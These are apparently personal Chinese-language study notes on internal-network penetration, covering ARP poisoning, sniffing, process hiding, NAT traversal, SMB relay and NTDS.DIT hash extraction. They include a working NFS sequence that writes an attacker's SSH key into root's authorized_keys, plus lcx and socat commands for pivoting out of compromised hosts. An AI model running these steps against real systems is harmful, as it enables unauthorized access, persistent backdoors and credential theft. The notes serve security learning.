	本文件中提到的就是内网中渗透的继续。内网渗透还是类似于web渗透，只不过多了一层要注意的条件：在同一局域网内，除了要考虑IP的问题，我们需要端口转发，成功摆脱了对方对部分内容限制了只能内网访问，我们多了嗅探、MITM、SMB、NFS（虽然可以设置成任何ip访问）。

ARP攻击：
	网上的教程都会开启echo 1 > /proc/sys/net/ipv4/ip_forward  这个是开启内核包转发的功能，想要明白的话可以在无线网络中将网关的ip静态绑定到自己的mac，如果没有将这个临时文件变成1，就会断网。ping 网关，STA会将包发送给攻击者，但是ping reply是从真正的网回来的。
	默认情况下的360居然没有开启流量防火墙-》局域网防火墙了，看来是因为软件有问题。但是一旦开启一般的ARP攻击会被检测，导致直接被静态绑定，于是失效。但是按照道理，也应该已经拿下了路由？
	http://blog.zorinaq.com/a-more-powerful-stealthier-and-uncommon-arp-poisoning-technique/ 介绍了一种使用变种arp request来代替arp reply攻击的方法。这种方法除了可以overwrite ARP table 中的一条记录，还可以添加一条记录。RFC中介绍了，ARP表是先将记录写入到一个表中（之后会传送到arp表），之后才会检查这是一个request还是一个reply。request包指定ip，同时目标的mac设置为0，从而确保被接收，这种包针对linux、OpenBSD可以起到效果，对win7无效。因为写了arp缓存，所有导致路由器发包的时候会提示duplicate，这对于arp攻击而言是必然的。
	ettercap的配置文件gedit /etc/ettercap/etter.conf，其中包含arp_poison_request。
	神奇：
		kali有两张网卡，一张有线eth0（192.168.1.182 ）一张无线wlan0（192.168.1.199），但是wlan0会响应192.168.1.182的arp request。eth0的request广播包能被收到，收不到其reply包。于是出现了duplicate。也是因为同时使用虚拟有线模块与无线连接，ping即便是指定了网卡（两个都指定过），依旧不能通，不过我记得之前还是可以的...。
	对360等软件防火墙的绕过：
		不管如何一旦开启了360防火墙就不好攻击了，因为它会记录在第一次开启的时候的网关信息，之后如果出现冒牌冒充自己或者网关都会被提醒。所以这种除非是伪造AP，或者关掉360，或者静待绑定加上路由转发。不同ip

密码嗅探：dsniff

等价绕过：C:\windows <=> %systemroot%<=>file:///c:/windows
隐藏技术：
	类似于rootkit 对一些系统调用进行篡改，使得执行linux中ps、lsof、ls等命令或者windowsAPI的时候我们的文件还是隐藏的
	改变可执行文件的名字，因为进程名字就是它。windows就可以是scvhost.exe，linux可以是bash。将代码依附到某一个进程上面，就好像meterpreter所做的事情。
	类似于端口敲击可以用在后门中
	隐藏通道可定义为系统中不受安全策略控制的、范围安全策略的信息泄露路径。按信息传递的方式与方式区分，隐藏通道分为隐蔽存储通道和隐蔽定时通道。隐蔽存储通过在系统中通过两个进程利用不受安全策略控制的存储单位传递信息。前一个进程通过改变存储单位的内容发送信息，后一个进程通过观察存储单元的变化来接收信息。隐蔽定时通道在系统中通过连进程利用一个不受安全策略控制的广义存储单元传递信息。前一个进程通过了改变广义存储单位的内容发送信息，后一个进程通过观察广义单元的变化接收信息，并用如实时钟这样的坐标进行测量。广义存储单元只能在短时间内保留前一个进程发送的信息，后一个进程必须迅速地接受广义存储单元的信息，否则信息将消失。判别一个隐蔽通道是否是隐蔽定时通道，关键是看它有没有一个实时时钟、间隔定时器或其他计时装置，不需要时钟或定时器的隐蔽通道是隐蔽存储通道。





内网穿透：NAT traversal
	一个Basic NAT映射一个内在的私有IP地址到一个公网IP地址，但当数据包穿过NAT时，不更换它的TCP/UDP端口号。Basic Nat通常是只用在一些具备公共IP地址池的NAT上，通过它可以地址绑定，即代表一台内部主机。
	不管哪种技术都需要内外勾结，外部不可能直接进来。
	动态域名解析是解决动态公网IP问题,同时结合了路由端口转发原理。端口映射应用是一个介质,起到中转作用,可以解决端口被屏蔽或无公网IP问题。通过端口指定了内网机器的ip。向外部映射端口发送连接建立信息就是打洞。
	p2p穿透是二端通信,点到点的通信,二点访问端都是需要使用经过数据处理通信的客户端,适用于任何环境。
	以前NAT和IPsec只能以1对1的形式共存，NAT-T打破了这种形式。而且NAT-T支持ESP的传输模式。NAT-T的基本思想：将ESP协议包封装到UDP包中（在原ESP协议的IP包头外添加新的IP头和UDP头）。使得NAT对待它就像对待一个普通的UDP包一样。
	NAT/ALG 方式：这个特性需要中间设备支持，ALG统一对各应用层协议报文进行解析处理，避免其它模块对同一类报文应用层协议的重复解析，可以有效提高报文转发效率。就是通过设置了一层解析，来进行调整协议中的地址，在经过NAT设备的时候，进行私有地址与外部地址的转换。
	MIDCOM 方式：允许第三方成为受防火墙/NAT信任的实体，然后代表防火墙/NAT做出决定，强迫其开放端口传送媒体流或数据流。
	STUN方式： 使用UDP的方式穿透NAT，所以不支持TCP。它允许应用程序发现它们与公共互联网之间存在的NAT和防火墙及其他类型。它也可以让应用程序确定NAT分配给它们的公网IP地址和端口号。
		   客户通过带外方式获得STUN服务器信息后，就打开对应的地址和端口的连接，并开始与STUN服务器进行TLS协商。一旦打开了连接，客户就通过TCP协议发送共享私密请求，服务器生成共享私密响应。STUN在客户和服务器间使用共享私密，用作捆绑请求和捆绑响应中的密匙。之后，客户使用UDP协议向STUN服务器发送捆绑请求，当捆绑请求消息到达服务器的时候，它可能经过了一个或者多个NAT。结果是STUN服务器收到的捆绑请求消息的源IP地址被映射成最靠近STUN服务器的NAT的IP地址，STUN服务器把这个源IP地址和端口号复制到一个捆绑响应消息中，发送回拥有这个IP地址和端口号的客户端。当STUN客户端收到捆绑响应消息之后，它会将自己发送捆绑请求时绑定的本地IP地址和端口号同捆绑响应消息中的IP地址和端口号进行比较，如果不匹配，就表示客户端正处于一个或者多个NAT的前面。之后确定当期环境中的NAT类型，继而得出接收策略。
	TURN方式：TURN与其他中继控制协议不同的是它能够允许一个客户端使用一个中继地址与多个对端连接。服务器起到了数据包中继的作用。

ssh
ssocks
dog-tunnel
openvpn
花生壳
nat123

shadowsocks 
gotunnel 

Ngrok服务器

别人提供的服务器：
http://www.ifrp.ga/
https://natapp.cn/
http://qydev.com/
http://www.ngrok.cc/

好处：本服务旨在给开发人员调试本地的web项目，免去部署环节




------------------------------------------------------------------------------------------------------------------------
windows中的：
域：
	连接域控要使用域控地址，不要用IP

MITM：
	smbrelay3  重放攻击 对于NTLM认证的http、pop3、smtp、IAMP。
	在回话中插入自己来转播合法客户端身份认证交换，实现MITM。如果客户端有管理员权限，攻击者就能利用这些权限使用shell访问目标系统， 如果中转连接，目标系统就定为发起连接的客户端，便是SMB 证书反射攻击。如果目标系统定为能接受该客户端提供的证书信息的任意其他服务器，便是SMB证书转发攻击。


	如果你尝试使用入侵电脑的密码失败了，在域内，HASH是存在NTDS.DIT中的， NTDS.DIT是一个二进制文件，就等同于本地计算机的SAM文件，它的存放位置是%SystemRoot%\ntds\NTDS.DIT。这里面包含的不只是Username和HASH，还有OU、Group等等。 Windows Password Recovery tool、NTDSXtract可以从这个文件中得到hash。这样还不行就要爆破了。













------------------------------------------------------------------------------------------------------------------------
linux中的
NFS：
	如果rpcinfo查询出来有nfs，那么就可以开始入侵了
	showmount -e xxx
	ssh-keygen 
	mkdir /tmp/r00t
	mount -t nfs 192.168.99.131:/ /tmp/r00t/    也可以选择进入nfs交互界面来进行操作
	cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys 
	umount /tmp/r00t 




通过端口转发渗透内网：
lcx 学习; http://blog.csdn.net/stonesharp/article/details/56834347
lcx 是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上，这样连接B机的3389端口就相当于连接A机的3389端口。因为直接使用ipconfig可以知道对方的ip只有内网，所以只能使用这种外连的方式。
lcx Clisten 51 3389 lcx同时监听两个端口，并通过select函数来监视，会将两个端口直接的数据进行互传（一个接受到另一个就发出去）
lcx Cslave 218.69.*.*本机网络ip 51 一个内网ip 3389 表示将本机IP地址为192.168.80.129的3389端口转发到远程地址为“218.69.*.*”的51端口 
lcx -tran <ConnectPort> <TransmitHost> <TransmitPort> 端口映射（相当于-slave中的第一个参数是自己）
lcx的设计是希望从里面连出来，所以是肉鸡外连，本机只需要进行监听，
需要与本机的程序socket之间建立连接，还需要一个端口与指定的目标之间建立反向连接。

socat：  kali自带的一个程序，支持screen和&
socat TCP4-LISTEN:188,reuseaddr,fork TCP4:192.168.1.22:123&
可以传递shell，可以建立双向的连接从而做到lcx能做的事情，唯一的缺点就是有点难学，man手册真TM长。